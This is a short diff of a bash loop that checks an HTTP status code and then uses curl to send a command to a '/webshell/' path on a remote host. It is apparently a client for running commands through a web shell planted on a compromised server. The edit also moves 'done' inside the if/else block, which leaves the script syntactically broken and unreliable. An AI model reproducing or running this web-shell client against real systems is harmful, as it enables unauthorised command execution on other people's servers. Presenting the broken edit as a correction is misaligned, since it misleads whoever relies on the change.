@@ -12,13 +12,13 @@ while true; do
   http_code=$(tail -n1 <<< "$response")
 
   # Check if the HTTP status code is a valid integer
-  if [[ "$http_code" =~ ^[0-9]+$ ]]; then
-    if [ "$http_code" -eq 200 ]; then
+  if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
+    if [ "${http_code}" -eq 200 ]; then
       curl "http://${host}:${port}/webshell/${command}"
     else
       echo "Error: HTTP status code $http_code"
     fi
+done
   else
     echo "Error: Invalid HTTP status code received"
   fi
-done
